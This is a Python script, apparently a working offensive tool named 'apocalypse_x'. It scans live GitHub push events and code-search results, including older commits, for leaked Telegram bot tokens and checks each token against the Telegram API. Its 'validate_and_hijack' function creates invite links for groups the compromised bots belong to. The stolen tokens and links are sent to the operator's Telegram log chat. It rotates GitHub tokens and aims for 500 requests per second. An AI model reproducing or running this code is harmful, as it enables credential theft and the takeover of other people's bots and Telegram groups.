import asyncio, aiohttp, re, base64, random
from telethon import TelegramClient
from aiolimiter import AsyncLimiter
from config import Config

# --- [ TARGETS ] ---
EXTENSIONS = ['env', 'php', 'js', 'json', 'yml', 'py', 'sh', 'sql']
KEYWORDS = ['bot_token', 'tg_token', 'api_key', '8048749705'] # Bot ID range 
TOKEN_REGEX = r'[0-9]{10}:[a-zA-Z0-9_-]{35}'

client = TelegramClient('apocalypse_x', Config.API_ID, Config.API_HASH).start(bot_token=Config.BOT_TOKEN)
limiter = AsyncLimiter(500, 1) # God Speed: 500 requests per second

async def validate_and_hijack(token, source, method):
    """Token check aur group admin link extraction"""
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(f"https://api.telegram.org/bot{token}/getMe") as r:
                if r.status == 200:
                    bot_data = (await r.json())['result']
                    user = bot_data['username']
                    
                    # Group Link Generation
                    links = []
                    async with session.get(f"https://api.telegram.org/bot{token}/getUpdates") as up:
                        u_data = await up.json()
                        if u_data.get("ok"):
                            for item in u_data["result"]:
                                chat = item.get("message", {}).get("chat", {})
                                if chat.get("type") in ["group", "supergroup"]:
                                    cid = chat["id"]
                                    async with session.get(f"https://api.telegram.org/bot{token}/exportChatInviteLink?chat_id={cid}") as inv:
                                        res = await inv.json()
                                        if res.get("ok"): links.append(f"🏰 {chat.get('title')}: {res['result']}")

                    msg = (f"☢️ **LIVE COMMIT HIT: {method}**\n\n"
                           f"👤 **Bot:** @{user}\n"
                           f"🔑 **Token:** `{token}`\n"
                           f"🔗 **Source:** {source}\n\n"
                           f"🔓 **Admin Links:**\n" + ("\n".join(links) if links else "Searching for groups..."))
                    await client.send_message(Config.LOG_CHAT, msg)
        except: pass

async def scan_live_events(session, gh_token):
    """GitHub Events API se bilkul taaza (live) commits pakadna"""
    headers = {"Authorization": f"token {gh_token}"}
    url = "https://api.github.com/events"
    try:
        async with session.get(url, headers=headers) as r:
            events = await r.json()
            for event in events:
                if event['type'] == 'PushEvent':
                    repo = event['repo']['name']
                    for commit in event['payload'].get('commits', []):
                        c_url = commit['url']
                        async with session.get(c_url, headers=headers) as cr:
                            c_data = await cr.json()
                            for file in c_data.get('files', []):
                                patch = file.get('patch', '') # Recent changes
                                tokens = re.findall(TOKEN_REGEX, patch)
                                for t in set(tokens):
                                    await validate_and_hijack(t, f"https://github.com/{repo}", "LIVE_EVENT")
    except: pass

async def scan_blame_history(session, item, gh_token):
    """Blame API se purani history aur history ke andar ke tokens nikalna"""
    async with limiter:
        headers = {"Authorization": f"token {gh_token}"}
        try:
            # Recursive check of commit history for this file
            repo_name = item['repository']['full_name']
            file_path = item['path']
            commits_url = f"https://api.github.com/repos/{repo_name}/commits?path={file_path}"
            
            async with session.get(commits_url, headers=headers) as r:
                commits = await r.json()
                for c in commits[:5]: # Last 5 versions of the file
                    raw_url = f"https://raw.githubusercontent.com/{repo_name}/{c['sha']}/{file_path}"
                    async with session.get(raw_url, headers=headers) as rr:
                        text = await rr.text()
                        tokens = re.findall(TOKEN_REGEX, text)
                        for t in set(tokens):
                            await validate_and_hijack(t, item['html_url'], "HISTORY_BLAME")
        except: pass

async def start_apocalypse():
    print("💀 APOCALYPSE-X IS LIVE. MONITORING THE GLOBAL PUSH EVENTS...")
    async with aiohttp.ClientSession() as session:
        while True:
            gh_token = random.choice(Config.GH_TOKENS).strip()
            
            # Task 1: Live Events (Super Fast)
            await scan_live_events(session, gh_token)
            
            # Task 2: Search + Blame (Deep)
            ext = random.choice(EXTENSIONS)
            key = random.choice(KEYWORDS)
            url = f"https://api.github.com/search/code?q=extension:{ext}+{key}&sort=indexed&order=desc"
            
            try:
                async with session.get(url, headers={"Authorization": f"token {gh_token}"}) as r:
                    if r.status == 200:
                        data = await r.json()
                        for item in data.get('items', []):
                            await scan_blame_history(session, item, gh_token)
            except: pass
            await asyncio.sleep(1)

if __name__ == "__main__":
    with client:
        client.loop.run_until_complete(start_apocalypse())
